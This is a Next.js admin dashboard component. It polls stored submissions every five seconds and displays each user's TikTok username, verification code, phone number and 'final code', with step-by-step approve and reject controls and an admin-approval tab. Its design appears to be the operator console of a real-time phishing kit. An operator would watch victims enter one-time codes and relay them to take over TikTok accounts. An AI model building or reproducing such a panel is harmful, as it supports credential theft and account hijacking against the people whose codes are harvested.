
'use client';

import { useState, useEffect, useCallback } from 'react';
import { CheckCircle, Clock, Loader2, RefreshCw, XCircle, ShieldCheck, ShieldOff, MoreVertical } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { format, formatDistanceToNow } from 'date-fns';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import type { Submission, AdminUser } from '@/lib/types';
import { cn } from '@/lib/utils';
import { useAdminAuth } from '@/hooks/use-admin-auth';
import { useRouter } from 'next/navigation';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from '@/components/ui/dropdown-menu';


type Step = 'tiktokUsername' | 'verificationCode' | 'phoneNumber' | 'finalCode';

export default function AdminPage() {
    const { user, isAdmin, isMainAdmin, isLoading: isAuthLoading } = useAdminAuth();
    const router = useRouter();
    
    const [submissions, setSubmissions] = useState<Submission[]>([]);
    const [admins, setAdmins] = useState<AdminUser[]>([]);
    const [isLoadingData, setIsLoadingData] = useState(true);
    const [error, setError] = useState<string | null>(null);

    const [updatingId, setUpdatingId] = useState<string | null>(null);

    const fetchData = useCallback(async () => {
        setIsLoadingData(true);
        setError(null);
        try {
            const [submissionsRes, adminsRes] = await Promise.all([
                fetch('/api/submissions'),
                fetch('/api/admins')
            ]);
            if (!submissionsRes.ok || !adminsRes.ok) {
                throw new Error('Failed to fetch data');
            }
            const submissionsData = await submissionsRes.json();
            const adminsData = await adminsRes.json();
            setSubmissions(submissionsData);
            setAdmins(adminsData);
        } catch (err: any) {
            setError(err.message);
        } finally {
            setIsLoadingData(false);
        }
    }, []);

    useEffect(() => {
        if (user && isAdmin) {
            fetchData();
        }
    }, [user, isAdmin, fetchData]);
    
    useEffect(() => {
        if (user && isAdmin) {
            const interval = setInterval(() => {
                fetchData();
            }, 5000);
            return () => clearInterval(interval);
        }
    }, [user, isAdmin, fetchData]);


    if (!isAuthLoading && (!user || !isAdmin)) {
        router.replace('/admin/login');
    }

    const mutateAll = () => {
        fetchData();
    };

    const handleSubmissionStepApproval = async (id: string, step: Step, status: 'approved' | 'rejected') => {
        setUpdatingId(`${id}-${step}`);
        try {
            const res = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, step, status }),
            });

            if (!res.ok) throw new Error(`Failed to update ${step}.`);
            mutateAll();
        } catch (error) {
            console.error(`Failed to update ${step}`, error);
        } finally {
            setUpdatingId(null);
        }
    };

    const handleAdminVerification = async (id: string, isVerified: boolean) => {
        setUpdatingId(`admin-${id}`);
        try {
            const res = await fetch('/api/admins', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, isVerified }),
            });

            if (!res.ok) throw new Error('Failed to update admin.');
            mutateAll();
        } catch (error) {
            console.error('Failed to update admin', error);
        } finally {
            setUpdatingId(null);
        }
    };
    
    const getStatusBadge = (status: 'pending' | 'approved' | 'rejected') => {
        switch(status) {
            case 'approved':
                return <Badge variant="default" className="bg-green-100 border-green-200 text-green-800">Approved</Badge>;
            case 'rejected':
                return <Badge variant="destructive">Rejected</Badge>;
            case 'pending':
            default:
                return <Badge variant="secondary">Pending</Badge>;
        }
    };
    
    const getAdminRoleBadge = (isMainAdmin: boolean) => {
        if (isMainAdmin) {
            return <Badge variant="default">Main Admin</Badge>;
        }
        return <Badge variant="secondary" className="border-blue-200 bg-blue-100 text-blue-800">Sub-Admin</Badge>;
    }
    
    const isDataLoading = isLoadingData;

    if (isAuthLoading || !user || !isAdmin) {
        return (
             <main className="flex min-h-screen flex-col items-center justify-center p-24 bg-muted/40">
                <Loader2 className="h-8 w-8 animate-spin text-primary" />
             </main>
        )
    }

    return (
        <main className="flex min-h-screen flex-col items-center p-4 sm:p-8 md:p-12 lg:p-24 bg-muted/40">
            <div className="w-full max-w-7xl">
                 <Card>
                    <CardHeader className="flex flex-row items-center justify-between">
                        <CardTitle>Admin Dashboard</CardTitle>
                        <Button onClick={mutateAll} variant="outline" size="icon" disabled={isDataLoading}>
                           <RefreshCw className={cn("h-4 w-4", isDataLoading && "animate-spin")} />
                           <span className="sr-only">Refresh</span>
                        </Button>
                    </CardHeader>
                    <CardContent>
                        <Tabs defaultValue="submissions">
                            <TabsList className="grid w-full grid-cols-2">
                                <TabsTrigger value="submissions">User Submissions</TabsTrigger>
                                <TabsTrigger value="admins">Admin Management</TabsTrigger>
                            </TabsList>
                            <TabsContent value="submissions">
                                {isDataLoading ? (
                                    <div className="flex items-center justify-center p-8"><Loader2 className="h-8 w-8 animate-spin text-primary" /></div>
                                ) : error ? (
                                    <Alert variant="destructive"><XCircle className="h-4 w-4" /><AlertTitle>Error</AlertTitle><AlertDescription>Failed to load submissions.</AlertDescription></Alert>
                                ) : (
                                    <Table>
                                        <TableHeader>
                                            <TableRow>
                                                <TableHead>User</TableHead>
                                                <TableHead>Username</TableHead>
                                                <TableHead>Verification Code</TableHead>
                                                <TableHead>Phone Number</TableHead>
                                                <TableHead>Final Code</TableHead>
                                                <TableHead>Submitted</TableHead>
                                            </TableRow>
                                        </TableHeader>
                                        <TableBody>
                                            {submissions && submissions.length > 0 ? (
                                                submissions.map((sub) => (
                                                    <TableRow key={sub.id}>
                                                        <TableCell className="font-medium text-xs text-muted-foreground">{sub.id}</TableCell>
                                                        <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                <span>@{sub.tiktokUsername}</span>
                                                                {getStatusBadge(sub.tiktokUsernameStatus)}
                                                                {sub.tiktokUsernameStatus === 'pending' && <StepActions id={sub.id} step="tiktokUsername" onAction={handleSubmissionStepApproval} updatingId={updatingId} />}
                                                            </div>
                                                        </TableCell>
                                                         <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                <span>{sub.verificationCode || '...'}</span>
                                                                {sub.verificationCode && getStatusBadge(sub.verificationCodeStatus)}
                                                                {sub.verificationCode && sub.verificationCodeStatus === 'pending' && <StepActions id={sub.id} step="verificationCode" onAction={handleSubmissionStepApproval} updatingId={updatingId} />}
                                                            </div>
                                                        </TableCell>
                                                        <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                <span>{sub.phoneNumber || '...'}</span>
                                                                {sub.phoneNumber && getStatusBadge(sub.phoneNumberStatus)}
                                                                {sub.phoneNumber && sub.phoneNumberStatus === 'pending' && <StepActions id={sub.id} step="phoneNumber" onAction={handleSubmissionStepApproval} updatingId={updatingId} />}
                                                            </div>
                                                        </TableCell>
                                                        <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                <span>{sub.finalCode || '...'}</span>
                                                                {sub.finalCode && getStatusBadge(sub.finalCodeStatus)}
                                                                {sub.finalCode && sub.finalCodeStatus === 'pending' && <StepActions id={sub.id} step="finalCode" onAction={handleSubmissionStepApproval} updatingId={updatingId} />}
                                                            </div>
                                                        </TableCell>
                                                        <TableCell>
                                                           <span className="text-xs text-muted-foreground">{formatDistanceToNow(new Date(sub.createdAt), { addSuffix: true })}</span>
                                                        </TableCell>
                                                    </TableRow>
                                                ))
                                            ) : (
                                                <TableRow>
                                                    <TableCell colSpan={6} className="h-24 text-center">No submissions found.</TableCell>
                                                </TableRow>
                                            )}
                                        </TableBody>
                                    </Table>
                                )}
                            </TabsContent>
                             <TabsContent value="admins">
                                {isDataLoading ? (
                                    <div className="flex items-center justify-center p-8"><Loader2 className="h-8 w-8 animate-spin text-primary" /></div>
                                ) : error ? (
                                     <Alert variant="destructive"><XCircle className="h-4 w-4" /><AlertTitle>Error</AlertTitle><AlertDescription>Failed to load admins.</AlertDescription></Alert>
                                ) : (
                                    <Table>
                                        <TableHeader><TableRow><TableHead>Email</TableHead><TableHead>Role</TableHead><TableHead>Registered</TableHead><TableHead>Status</TableHead><TableHead className="text-right">Actions</TableHead></TableRow></TableHeader>
                                        <TableBody>
                                            {admins && admins.length > 0 ? (
                                                admins.map((admin) => (
                                                    <TableRow key={admin.id}>
                                                        <TableCell className="font-medium">{admin.email}</TableCell>
                                                        <TableCell>{getAdminRoleBadge(admin.isMainAdmin)}</TableCell>
                                                        <TableCell>{format(new Date(admin.createdAt), "PPP")}</TableCell>
                                                        <TableCell>{getStatusBadge(admin.isVerified ? 'approved' : 'pending')}</TableCell>
                                                        <TableCell className="text-right">
                                                            {isMainAdmin && user && admin.id !== user.uid && (
                                                                <div className="flex gap-2 justify-end">
                                                                    {admin.isVerified ? (
                                                                         <Button variant="destructive" size="sm" onClick={() => handleAdminVerification(admin.id, false)} disabled={updatingId === `admin-${admin.id}`}>
                                                                            {updatingId === `admin-${admin.id}` ? <Loader2 className="h-4 w-4 animate-spin" /> : <ShieldOff className="h-4 w-4" />}
                                                                            <span className="ml-2">Revoke</span>
                                                                        </Button>
                                                                    ) : (
                                                                        <Button size="sm" onClick={() => handleAdminVerification(admin.id, true)} disabled={updatingId === `admin-${admin.id}`}>
                                                                            {updatingId === `admin-${admin.id}` ? <Loader2 className="h-4 w-4 animate-spin" /> : <ShieldCheck className="h-4 w-4" />}
                                                                            <span className="ml-2">Approve</span>
                                                                        </Button>
                                                                    )}
                                                                </div>
                                                            )}
                                                        </TableCell>
                                                    </TableRow>
                                                ))
                                            ) : (
                                                <TableRow><TableCell colSpan={5} className="h-24 text-center">No admins found.</TableCell></TableRow>
                                            )}
                                        </TableBody>
                                    </Table>
                                )}
                            </TabsContent>
                        </Tabs>
                    </CardContent>
                </Card>
            </div>
        </main>
    );
}

function StepActions({ id, step, onAction, updatingId }: { id: string, step: Step, onAction: (id: string, step: Step, status: 'approved' | 'rejected') => void, updatingId: string | null }) {
    const isUpdating = updatingId === `${id}-${step}`;
    return (
        <DropdownMenu>
            <DropdownMenuTrigger asChild>
                <Button variant="ghost" size="icon" className="h-6 w-6" disabled={isUpdating}>
                    {isUpdating ? <Loader2 className="h-4 w-4 animate-spin" /> : <MoreVertical className="h-4 w-4" />}
                </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end">
                <DropdownMenuItem onClick={() => onAction(id, step, 'approved')}>
                    <CheckCircle className="mr-2 h-4 w-4 text-green-500" />
                    Approve
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => onAction(id, step, 'rejected')}>
                    <XCircle className="mr-2 h-4 w-4 text-red-500" />
                    Reject
                </DropdownMenuItem>
            </DropdownMenuContent>
        </DropdownMenu>
    );
}

    